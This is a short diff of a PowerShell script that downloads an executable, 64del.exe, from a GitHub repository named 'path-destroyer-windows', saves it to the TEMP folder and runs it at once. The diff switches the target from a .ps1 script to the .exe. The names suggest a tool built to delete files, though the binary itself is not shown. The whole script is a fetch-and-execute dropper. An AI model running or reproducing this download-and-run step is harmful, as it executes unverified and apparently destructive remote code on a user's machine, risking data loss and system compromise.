@@ -6,8 +6,9 @@
 # & $tmp
 # Remove-Item $tmp
 
-$url = "https://raw.githubusercontent.com/Toaster123G/path-destroyer-windows/main/run.ps1"
-$tmp = "$env:TEMP\64del.exe"
+$url = "https://raw.githubusercontent.com/Toaster123G/path-destroyer-windows/main/64del.exe"
+ $tmp = "$env:TEMP\64del.exe"
+# $tmp = "./64del.exe"
 
 Invoke-WebRequest $url -Outfile $tmp
 & $tmp
